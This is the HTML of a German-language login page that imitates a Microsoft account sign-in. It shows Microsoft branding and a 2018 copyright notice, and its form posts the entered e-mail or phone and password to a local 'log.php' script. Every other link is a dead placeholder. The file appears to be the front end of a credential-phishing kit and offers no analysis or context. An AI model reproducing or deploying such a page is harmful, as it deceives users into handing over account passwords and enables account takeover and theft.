
<html>
<head>
<title>Anmelden</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="images/hfavicon.ico" rel="shortcut icon">
</head>
<body >
	<div id="container">
		<div class="logo">
			<img src="images/hlogo.png">
			<div class="header-wrapper">
				<h2 class="header-text">Anmelden</h2>
				<span>Verwenden Sie Ihr Microsoft-Konto.<br /><a href="#">Was ist das?</a></span>
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<div class="error user-error"></div>
						<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="E-Mail, Telefon oder Skype" value="" name="username" />						<div class="error input-fields2"></div>
						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="Kennwort" />
					</div>

					<div class="input-checkbox">
						<input type="checkbox"><label>Angemeldet bleiben</label>
					</div>
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Anmelden" class="default">
					</div>
					<div class="input-fields forgot">
						<p>Sie haben noch kein Konto? <a href="#">Dann erstellen Sie jetzt eins!</a></p>
						<p><a href="#">Ich habe mein Kennwort vergessen.</a></p>
			                        <p class="brand">Microsoft ©2018</p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>